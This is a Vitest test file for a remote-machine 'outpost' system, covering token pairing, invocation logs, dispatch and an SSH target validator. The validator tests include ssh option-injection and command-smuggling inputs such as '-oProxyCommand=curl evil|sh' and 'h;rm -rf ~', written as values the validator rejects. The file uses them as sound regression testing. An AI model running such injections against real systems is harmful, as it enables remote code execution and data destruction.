import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { mkdtempSync, rmSync, readFileSync, existsSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

// The daemon module is guarded by an import.meta.url === argv[1] check, so importing it
// here does NOT start the server. Its path helpers read GARRISON_HOME dynamically, so a
// sandbox set before each call is honoured.
// @ts-ignore — pure .mjs (repo convention for kanban/outpost lib imports); typed at call sites
import { mintPairing, logInvocation, readInvocationLog, buildInstaller, startHost } from "../scripts/outpost-host.mjs";
// @ts-ignore — pure .mjs; typed at call sites
import { resolveOutpostDispatch, outpostRunFn } from "../fittings/seed/kanban-loop/lib/outpost-dispatch.mjs";
// @ts-ignore — pure .mjs; the UI server is guarded by an entry check so importing is side-effect-free
import { isValidSshTarget } from "../fittings/seed/outpost-tailscale-host/scripts/server.mjs";

interface LogRow { at: string; verb: string; outpost: string; caller: string; ok: boolean; ms: number; error?: string }

let sandbox: string;
let prevHome: string | undefined;

beforeEach(() => {
  sandbox = mkdtempSync(join(tmpdir(), "outpost-fit-"));
  prevHome = process.env.GARRISON_HOME;
  process.env.GARRISON_HOME = sandbox;
});

afterEach(() => {
  if (prevHome === undefined) delete process.env.GARRISON_HOME;
  else process.env.GARRISON_HOME = prevHome;
  try { rmSync(sandbox, { recursive: true, force: true }); } catch { /* ignore */ }
});

describe("pairing mint", () => {
  it("mints a hex token, marks the entry pending, and writes the registry", () => {
    const entry = mintPairing("studio-mac");
    expect(entry.name).toBe("studio-mac");
    expect(entry.token).toMatch(/^[0-9a-f]{48}$/); // 24 random bytes, hex
    expect(entry.pending).toBe(true);

    const regPath = join(sandbox, "outpost-registry.json");
    expect(existsSync(regPath)).toBe(true);
    const reg = JSON.parse(readFileSync(regPath, "utf8"));
    expect(reg.outposts).toHaveLength(1);
    expect(reg.outposts[0]).toMatchObject({ name: "studio-mac", pending: true });
    expect(reg.outposts[0].token).toBe(entry.token);
  });

  it("re-pairing a name replaces its token and keeps it pending", () => {
    const first = mintPairing("m1");
    const second = mintPairing("m1");
    expect(second.token).not.toBe(first.token);
    const reg = JSON.parse(readFileSync(join(sandbox, "outpost-registry.json"), "utf8"));
    expect(reg.outposts).toHaveLength(1);
    expect(reg.outposts[0].token).toBe(second.token);
    expect(reg.outposts[0].pending).toBe(true);
  });

  it("buildInstaller emits the one-line curl | bash installer", () => {
    const installer = buildInstaller("m1", "tok123", "100.1.2.3", 3702);
    expect(installer).toBe(
      "curl -fsSL http://100.1.2.3:3702/install.sh | GARRISON_HOST=http://100.1.2.3:3702 GARRISON_TOKEN=tok123 GARRISON_MACHINE=m1 bash"
    );
  });
});

describe("invocation log", () => {
  it("appends per-outpost entries and tails the last 20", () => {
    for (let i = 1; i <= 25; i++) {
      logInvocation({ verb: "exec.run", outpost: "m1", caller: "test", ok: true, ms: i });
    }
    const tail = readInvocationLog("m1", 20);
    expect(tail).toHaveLength(20);
    // Chronological (oldest→newest); the last 20 of 25 are ms 6..25.
    expect(tail[0].ms).toBe(6);
    expect(tail[19].ms).toBe(25);
    expect(tail[19]).toMatchObject({ verb: "exec.run", outpost: "m1", ok: true });
    expect(tail[0].at).toBeTruthy();
  });

  it("filters by outpost and records failures with the error", () => {
    logInvocation({ verb: "exec.run", outpost: "m1", caller: "a", ok: true, ms: 1 });
    logInvocation({ verb: "fs.read", outpost: "m2", caller: "b", ok: false, ms: 2, error: "not connected" });
    logInvocation({ verb: "exec.run", outpost: "m1", caller: "a", ok: true, ms: 3 });

    const m1 = readInvocationLog("m1", 20) as LogRow[];
    expect(m1).toHaveLength(2);
    expect(m1.every((e: LogRow) => e.outpost === "m1")).toBe(true);

    const m2 = readInvocationLog("m2", 20);
    expect(m2).toHaveLength(1);
    expect(m2[0]).toMatchObject({ ok: false, error: "not connected" });
  });
});

describe("resolveOutpostDispatch (card affinity)", () => {
  it("runs locally when the card has no outpost affinity", () => {
    expect(resolveOutpostDispatch({}, [])).toEqual({ ok: true, local: true });
    expect(resolveOutpostDispatch({ outpost: "" }, [{ name: "dev", connected: true }]))
      .toEqual({ ok: true, local: true });
  });

  it("dispatches when the named outpost is connected", () => {
    const res = resolveOutpostDispatch({ outpost: "dev" }, [
      { name: "dev", connected: true },
      { name: "other", connected: false },
    ]);
    expect(res).toEqual({ ok: true, outpost: "dev" });
  });

  it("fails (park) when the named outpost is registered but offline", () => {
    const res = resolveOutpostDispatch({ outpost: "dev" }, [{ name: "dev", connected: false }]);
    expect(res.ok).toBe(false);
    expect(res.outpost).toBe("dev");
    expect(res.reason).toMatch(/offline/i);
  });

  it("fails (park) when the named outpost is unknown", () => {
    const res = resolveOutpostDispatch({ outpost: "ghost" }, [{ name: "dev", connected: true }]);
    expect(res.ok).toBe(false);
    expect(res.outpost).toBe("ghost");
    expect(res.reason).toMatch(/not registered/i);
  });
});

describe("outpostRunFn (v1 exec.run relay)", () => {
  afterEach(() => { vi.restoreAllMocks(); vi.unstubAllGlobals(); });

  it("relays the prompt as a base64 exec.run and unwraps stdout", async () => {
    const fetchMock = vi.fn().mockResolvedValue({
      ok: true,
      json: async () => ({ ok: true, result: { payload: { stdout: "hello from mac" } } }),
    });
    vi.stubGlobal("fetch", fetchMock);

    const run = outpostRunFn("http://127.0.0.1:3702", "dev");
    const out = await run({ prompt: "do the thing" });
    expect(out).toEqual({ reply: "hello from mac" });

    const [url, init] = fetchMock.mock.calls[0];
    expect(url).toBe("http://127.0.0.1:3702/outposts/dev/rpc");
    const body = JSON.parse((init as { body: string }).body);
    expect(body.type).toBe("exec.run");
    // The prompt is base64-encoded into a `base64 -d | claude -p` pipeline.
    const b64 = Buffer.from("do the thing", "utf8").toString("base64");
    expect(body.payload.command).toContain(b64);
    expect(body.payload.command).toContain("claude -p");
  });

  it("throws on an RPC-level error", async () => {
    vi.stubGlobal("fetch", vi.fn().mockResolvedValue({
      ok: true,
      json: async () => ({ ok: false, error: "outpost 'dev' not connected" }),
    }));
    const run = outpostRunFn("http://127.0.0.1:3702", "dev");
    await expect(run({ prompt: "x" })).rejects.toThrow(/not connected/);
  });
});

describe("outpost-host HTTP (ephemeral daemon)", () => {
  let host: Awaited<ReturnType<typeof startHost>>;

  beforeEach(async () => {
    host = await startHost({ port: 0, bind: "127.0.0.1" });
  });

  afterEach(async () => {
    await host.close();
  });

  it("GET /install.sh serves the bootstrap script", async () => {
    const res = await fetch(`http://127.0.0.1:${host.port}/install.sh`);
    expect(res.status).toBe(200);
    expect(res.headers.get("content-type")).toMatch(/text\/plain/);
    const body = await res.text();
    expect(body).toContain("Garrison Outpost Bootstrap");
    expect(body).toContain("GARRISON_TOKEN");
  });

  it("POST /registry/pair mints a token + installer and registers a pending outpost", async () => {
    const res = await fetch(`http://127.0.0.1:${host.port}/registry/pair`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ name: "ci-mac" }),
    });
    expect(res.status).toBe(200);
    const data = await res.json();
    expect(data.name).toBe("ci-mac");
    expect(data.token).toMatch(/^[0-9a-f]{48}$/);
    expect(data.pending).toBe(true);
    expect(typeof data.host).toBe("string");
    expect(data.installer).toContain("/install.sh");
    expect(data.installer).toContain(`GARRISON_TOKEN=${data.token}`);
    expect(data.installer).toContain("GARRISON_MACHINE=ci-mac");

    // The pending outpost now shows up in GET /outposts with the verb catalog.
    const list = await (await fetch(`http://127.0.0.1:${host.port}/outposts`)).json();
    const entry = list.outposts.find((o: { name: string }) => o.name === "ci-mac");
    expect(entry).toBeTruthy();
    expect(entry.pending).toBe(true);
    expect(entry.connected).toBe(false);
    expect(Array.isArray(entry.verbs)).toBe(true);
    expect(entry.verbs).toContain("exec.run");
  });

  it("GET /outposts/:name/log returns the tailed invocation log", async () => {
    // Seed the sandbox log directly, then read it back through the HTTP endpoint.
    for (let i = 1; i <= 3; i++) {
      logInvocation({ verb: "exec.run", outpost: "ci-mac", caller: "seed", ok: true, ms: i });
    }
    const res = await fetch(`http://127.0.0.1:${host.port}/outposts/ci-mac/log?limit=20`);
    expect(res.status).toBe(200);
    const data = await res.json();
    expect(data.ok).toBe(true);
    expect(data.entries).toHaveLength(3);
    expect(data.entries[2].ms).toBe(3);
  });
});

// GARRISON-UNIFY-V1 S9 security regression: the SSH provisioning target
// (user@host) is placed as an argv token after ssh's own -o flags. spawn()
// uses no shell, so shell metacharacters can't execute - but a value beginning
// with "-" is parsed by ssh's getopt as an option, and `-oProxyCommand=<cmd>`
// runs <cmd> locally. The endpoint is loopback-bound but unauthenticated (a
// drive-by cross-site POST can reach it), so handleProvision validates strictly
// before ssh ever sees the value.
describe("SSH target validation (S9 provisioning RCE guard)", () => {
  it("accepts legitimate usernames and hostnames/IPs/MagicDNS/IPv6", () => {
    expect(isValidSshTarget("ggomes", "mac.local")).toBe(true);
    expect(isValidSshTarget("ubuntu", "100.88.165.46")).toBe(true);
    expect(isValidSshTarget("_svc", "box.tailnet.ts.net")).toBe(true);
    expect(isValidSshTarget("dev", "fd7a:115c::1")).toBe(true);
  });

  it("rejects dash-leading values (ssh option / ProxyCommand injection)", () => {
    expect(isValidSshTarget("-oProxyCommand=curl evil|sh", "x")).toBe(false);
    expect(isValidSshTarget("root", "-oProxyCommand=touch /tmp/pwned")).toBe(false);
  });

  it("rejects whitespace and shell metacharacters, and empty values", () => {
    expect(isValidSshTarget("a b", "host")).toBe(false);
    expect(isValidSshTarget("root;touch x", "host")).toBe(false);
    expect(isValidSshTarget("user", "h;rm -rf ~")).toBe(false);
    expect(isValidSshTarget("", "host")).toBe(false);
    expect(isValidSshTarget("user", "")).toBe(false);
  });
});
